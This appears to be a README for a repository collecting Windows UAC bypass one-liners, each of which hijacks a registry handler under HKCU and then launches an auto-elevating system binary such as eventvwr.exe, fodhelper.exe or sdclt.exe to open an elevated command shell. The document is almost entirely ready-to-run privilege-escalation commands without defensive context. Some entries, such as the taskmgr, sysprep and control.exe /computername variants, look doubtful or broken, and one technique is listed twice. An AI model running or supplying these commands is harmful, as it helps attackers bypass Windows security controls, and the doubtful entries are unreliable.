# uac-bypass-oneliners

Collection of one-liners to bypass User Account Control (UAC) in Windows. These techniques exploit certain behavior in Windows applications to elevate privileges.

Techniques
<br>
Using eventvwr.exe: <br> <br>

```

reg add "HKCU\Software\Classes\mscfile\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "cmd /c start cmd" /f && eventvwr.exe
```
<br>
Using fodhelper.exe: <br> <br>

```

reg add HKCU\Software\Classes\ms-settings\shell\open\command /f /ve /t REG_SZ /d "cmd.exe" && start fodhelper.exe

```


Using computerdefaults.exe:<br> <br>

```

reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && start computerdefaults.exe
```
Using sdclt.exe:<br> <br>

```

reg add HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe /ve /t REG_SZ /d "cmd.exe" /f && start sdclt.exe
```
<br>
Using slui.exe:<br> <br>

```

reg add HKCU\Software\Classes\exefile\shell\open\command /ve /t REG_SZ /d "cmd.exe" /f && reg add HKCU\Software\Classes\exefile\shell\open\command /v DelegateExecute /f && start slui.exe
```

<br>
Using perfmon.exe: <br> <br>

```

reg add "HKCU\Software\Classes\mscfile\shell\open\command" /v DelegateExecute /t REG_SZ /d "" /f && reg add "HKCU\Software\Classes\mscfile\shell\open\command" /ve /t REG_SZ /d "cmd /c start cmd" /f && start perfmon.exe
```

Using taskmgr.exe: <br><br>


```
reg add HKCU\Software\Classes\taskmgr\shell\open\command /ve /t REG_SZ /d "cmd.exe" /f && start taskmgr.exe
```

Using ComputerDefaults.exe: <br><br>
```
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /ve /t REG_SZ /d "cmd.exe" /f && reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f && start computerdefaults.exe
```

Using sysprep.exe:

```

reg add HKCU\Software\Classes\AppID\{921C1A8B-9F15-4DA4-9235-0472C3A216E6} /f /ve /t REG_SZ /d "cmd.exe" && start C:\Windows\System32\sysprep\sysprep.exe
```

Using control.exe with /computername:

```

cmd /c reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe" /ve /d "cmd.exe" /f && control.exe /computername

```

